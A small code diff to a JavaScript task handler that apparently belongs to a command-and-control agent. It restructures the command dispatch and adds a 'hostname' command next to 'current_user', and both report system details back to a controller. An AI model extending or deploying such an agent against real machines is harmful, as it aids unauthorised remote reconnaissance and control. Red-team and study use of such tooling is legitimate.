@@ -91,10 +91,16 @@ function handleTasks(context, tasks) {
 		const command = task['command']
 		const parameters = task['parameters']
 
-		if (command == 'current_user') {
-			const output = os.userInfo().username
-			postTaskResponse(callbackUUID, taskID, output)
+		let output = ''
+		switch(command) {
+			case 'current_user':
+				output = os.userInfo().username
+				break
+			case 'hostname':
+				output = os.hostname()
+				break
 		}
+		postTaskResponse(callbackUUID, taskID, output)
 	}
 }
 
